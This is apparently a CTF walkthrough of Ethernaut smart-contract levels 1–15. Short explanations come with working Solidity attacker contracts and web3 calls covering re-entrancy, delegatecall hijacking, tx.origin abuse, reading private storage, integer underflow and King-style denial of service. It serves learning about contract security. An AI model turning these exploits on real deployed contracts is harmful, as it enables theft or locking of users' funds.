# Ethernaut solution

## 1. Fallback
Abusing erroneous logic between contract functions and fallback function.
```
await contract.contribute({value: 1234});
await contract.sendTransaction({value: 1234});
await contract.withdraw();
```

## 2. Fallout
Constructor is spelled wrongly so it becomes a regular function. In any case, you can't use the contract name as a constructor in solidity 0.5.0 and above.
```
await contract.Fal1out({value: 1234});
await contract.sendAllocation(await contract.owner());
```

## 3. Coinflip
Don't rely on block number for any validation logic. A malicious user can calculate the solution to bypass your validation if both txns in the same block i.e. wrapped in the same function call.

Note: For some reason, I can't seem to call these functions more than once in the same function call i.e. another function that calls one of these malicious functions multiple times in one function call.
``` 
pragma solidity ^0.6.0;
import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract AttackCoinFlip {
    using SafeMath for uint;
    
    address public targetContract;
    
    constructor(address _targetContract) public {
        targetContract = _targetContract;
    }
    
    function attackFlipWithContract() public{
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(targetContract).flip(side);
    }
    
    function attackFlipWithout() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
        bytes memory payload = abi.encodeWithSignature("flip(bool)", coinFlip == 1 ? true : false);
        (bool success, ) = targetContract.call(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 4. Telephone
When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from which is tx.origin.
```
pragma solidity ^0.6.0;
contract AttackTelephone {
    address public telephone;
    
    constructor(address _telephone) public {
        telephone = _telephone;
    }
    
    function changeBadOwner(address badOwner) public {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", badOwner);
        (bool success, ) = telephone.call(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 5. Token
No integer over/underflow protection. Always use [safemath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol) libraries. As long as you pass a value > 20, the condition in the first require statement will underflow and it will always pass. 
```
await contract.transfer(instance, 25)
```

## 6. Delegation
DelegateCall means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract. Since msg.sender, msg.data, msg.value are all preserved when performing a DelegateCall, you just needed to pass in a malicious msg.data i.e. the encoded payload of `pwn()` function to gain ownership of the `Delegation` contract.
```
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});

await contract.sendTransaction({
    data: payload
});
```

## 7. Force
You can easily forcibly send ether to a contract. Read [this](https://consensys.github.io/smart-contract-best-practices/known_attacks/#forcibly-sending-ether-to-a-contract) to learn more.
```
pragma solidity ^0.6.0;

contract AttackForce {
    
    constructor(address payable _victim) public payable {
        selfdestruct(_victim);
    }
}
```

## 8. Vault
Your private variables are private if you try to access it the normal way e.g. via another contract but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, you can still access it based on its index in the smart contract. Learn more about this [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage).x
```
const password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
```

## 9. King
This is a classic example of DDoS with unexpected revert when part of the logic in the victim's contract involves transferring ether to the previous "lead", which in this case is the king. A malicious user would create a smart contract with either:

- a `fallback` / `receive` function that does `revert()`
- or the absence of a `fallback` / `receive` function

Once the malicious user uses this smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter howm uch ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`
```
pragma solidity ^0.6.0;

contract AttackForce {
    
    constructor(address payable _victim) public payable {
        _victim.call.gas(1000000).value(1 ether)("");
    }
    
    receive() external payable {
        revert();
    }
}
```

## 10. Re-entrancy
The same hack as the DAO hack. Due to the ordering of the transactions, the malicious contract is able to keep calling the withdraw function as the internal state is only updated after the transfer is done. When the call.value is processed, the control is handed back to the `fallback` function of the malicious contract which then calls the withdraw function again. Note that the number of times the fallback function runs is based on the amount of gas submitted when you call `maliciousWithdraw()`. 

Note: You need to use `uint256` instead of `uint` when encoding the signature.
```
pragma solidity ^0.6.0;

contract AttackReentrancy {
    address payable victim;
    
    constructor(address payable _victim) public payable {
        victim = _victim;
        
        // Call Donate
        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
        victim.call.value(msg.value)(payload);
    }
    
    function maliciousWithdraw() public payable {
        // Call withdraw
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 0.5 ether);
        victim.call(payload);
    }
    
    fallback() external payable {
        maliciousWithdraw();
    }
    
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}
```

## 11. Elevator
Since `building.isLastFloor()` is not a view function, you could implement it in such a way where it returns a different value everytime it is called, even if it is called in the same function. Moreover, even if it were to be changed to a view function, you could also still [attack it](https://github.com/OpenZeppelin/ethernaut/pull/123#discussion_r317367511).

Note: You don't have to inherit an interface for the sake of doing it. It helps with the abstract constract checks when the contract is being compiled. As you can see in my implementation below, I just needed to implement `isLastFloor()` because at the end of the day, it still gets encoded into a hexidecimal function signature and as long as this particular signature exists in the contract, it will be called with the specified params. 

Sometimes `.call()` gives you a bad estimation of the gas required so you might have to manually configure how much gas you want to send along with your transaction. 
```
pragma solidity ^0.6.0;

contract AttackElevator  {
    bool public flag; 
    
    function isLastFloor(uint) public returns(bool) {
        flag = !flag;
        return !flag;
    }
    
    function forceTopFloor(address _victim) public {
        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
        _victim.call(payload);
    }
   
}
```

## 12. Privacy
This level is very similar to that of the level 8 Vault. In order to unlock the function, you need to be able to retrieve the value stored at `data[2]` but you need to first determine what position it is at. You can learn more about how storage variables are stored on the smart contract [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage). From that, we can tell that `data[2]` is stored at index 5! It's not supposed to be at index 4 because arrays are 0 based so when you want to get value at index 2, you're actually asking for the 3 value of the array i.e. index 5!! Astute readers will also notice that the password is actually casted to bytes16! So you'd need to know what gets truncated when you go from bytes32 to byets16. You can learn about what gets truncated during type casting [here](https://www.tutorialspoint.com/solidity/solidity_conversions.htm).

Note: Just a bit more details about the packing of storage variables. The 2 `uint8` and 1 `uint16` are packed together on storage according to the order in which they appeared in the smart contract. In my case, when i did `await web3.eth.getStorageAt(instance, 2)`, I had a return value of `0x000000000000000000000000000000000000000000000000000000004931ff0a`. The last 4 characters of your string should be the same as mine because our contracts both have the same values for `flattening` and `denomination`. 

`flattening` has a value of 10 and its hexidecimal representation is `0a` while `denomination` has a value of 255 and has a hexidecimal representation of `ff`. The confusing part is the last one which is supposed to represent `awkwardness` which is of type `uint16`. Since `now` returns you a uint256 (equivalent of block.timestamp i.e. the number of seconds since epoch), when you convert `4931` as a hex into decimals, you get the values `18737`. This value can be obtained by doing `epochTime % totalNumberOfPossibleValuesForUint16` i.e. `1585269041 % 65536 = 18737`. The biggest value for `uint16` is `65535` but to determine all possible values, you need to add `1` to `65535` more to also include 0. Hopefully this explanation helps you to better understand how values are packed at the storage level!
```
var data = await web3.eth.getStorageAt(instance, 5);
var key = data.slice(2, 34);
await contract.unlock(key);
```

## 13. Gatekeeper One
This level is probably the most challenging so far since you'll need to be able to pass 5 conditional checks to be able to register as an entrant.

1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address. 
2. `gateTwo` requires some trial and error regarding how much gas you should use. The simplest way to do this is to use `.call()` because you can specify exactly how much gas you want to use. Once you've initiated a failed transaction, play around with the remix debugger. Essentially you want to calculate the total cost of getting to exactly the point prior to the `gasleft()%8191 == 0`. For me, this is 254 gas so to pass this gate, I just needed to use a gas equivalent to some multiple of 8191 + 254 e.g. 8191 * 100 + 254 = 819354. This [spreadsheet](https://docs.google.com/spreadsheets/u/1/d/1n6mRqkBz3iWcOlRem_mO09GtSKEKrAsfO7Frgx18pNU/edit#gid=0) of opcodes gas cost might help... but honestly, just playing with the debugger should work.
3. To solve `gateThree`, it makes more sense to work backwards i.e. solve part 3 then part 2 then part 1 because even if you could pass part 1, your solution for part 1 may not pass part 2 and so on. Play around with remix while using [this](https://www.tutorialspoint.com/solidity/solidity_conversions.htm) to help you better understand what gets truncated when doing explicit casting. If you know how to do bit masking, this gate should be a piece of cake for you! Quick tip - you can ignore the `uint64()` when trying to solve this gate.

For some strange reason, my solution wouldn't pass on Ropsten but passed locally on remix.
```
pragma solidity ^0.5.0;

// Remix account[0] address = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c

contract AttackGatekeeperOne {
    address public victim;
    
    constructor(address _victim) public {
        victim = _victim;
    }
    
    // require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    // require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    

    function part3(bytes8 _gateKey) public view returns(bool) {
        // _gateKey has 16 characters
        // uint16(msg.sender) = truncating everything else but the last 4 characters of my address (733c) and converting it into uint16 returns 29500
        // for uint32 == uint16, the former needs to be left padded with 0s e.g. 00001234 == 1234 = true
        // solving uint32(uint64(_gateKey)) is trivial because it is the same as described above.
        // This function will return true for any _gateKey with the values XXXXXXXX0000733c where X can be hexidecimal character.
        return uint32(uint64(_gateKey)) == uint16(msg.sender);
    }
    
    function part2(bytes8 _gateKey) public pure returns(bool) {
        // This is saying that the truncated version of the _gateKey cannot match the original
        // e.g. Using 000000000000733c will fail because the return values for both are equal
        // However, as long as you can change any of the first 8 characters, this will pass.
        return uint32(uint64(_gateKey)) != uint64(_gateKey);
    }
    
    function part1(bytes8 _gateKey) public pure returns(bool) {
        // you can ignore the uint64 casting because it appears on both sides.
        // this is equivalent to uint32(_gateKey) == uint64(_gateKey);
        // the solution to this is the same as the solution to part3 i.e. you want a _gateKey where the last 8 digits is the same as the last 4 digits after
        // it is converted to a uint so something like 0000733c will pass.
        return uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));
    }
    
    // So the solution to this is to use XXXXXXXX0000<insert last 4 characters of your address> where X can be any hexidecimal characters except 00000000.
    function enter(bytes8 _key) public returns(bool) {
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = victim.call.gas(819354)(payload);
        require(success, "failed somewhere...");
    }
}
```

## 14. Gatekeeper Two
Very similar to the previous level except it requires you to know a little bit more about bitwise operations (specifically XOR) and about `extcodesize`.

1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address. 
2. `gateTwo` stumped me for a little while because how can both extcodesize == 0 and yet msg.sender != tx.origin? Well the solution to this is that all function calls need to come from the constructor! When first deploy a contract, the extcodesize of that address is 0 until the constructor is completed! 
3. `gateThree` is very easy to solve if you know the XOR rule of `if A ^ B = C then A ^ C = B`.

```
pragma solidity ^0.6.0;

contract AttackGatekeeperTwo {
    
    constructor(address _victim) public {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = _victim.call(payload);
        require(success, "failed somewhere...");
    }
    
    
    function passGateThree() public view returns(bool) {
        // if a ^ b = c then a ^ c = b;
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) = uint64(0) - 1
        // therefore uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 = uint64(_gateKey) 
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1;
        return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == uint64(0) - 1;
    }
}
```

## 15. Naught Coin
Just approve another address to take the coins out on behalf of player. Note that you will need to know how to generate the data payload using `web3.eth.encodeFunctionCall`. Once you have the `data` payload, you need to initiate the `web3.eth.sendTransaction` while the selected account on metamask is the spender's account. The reason for this is because `transferFrom()` checks the allowance of msg.sender. 
```
web3.eth.abi.encodeFunctionCall({
    name: 'transferFrom',
    type: 'function',
    inputs: [{
        type: 'address',
        name: 'sender'
    },{
        type: 'address',
        name: 'recipient'
    },{
        type: 'uint256',
        name: 'amount'
    }]
}, ['<insert owner address here>', '<insert spender address here>', '1000000000000000000000000']);

await web3.eth.sendTransaction({
    to: "insert address of contract instance here",
    from: "insert address of spender",
    data: "insert data payload here"
})
```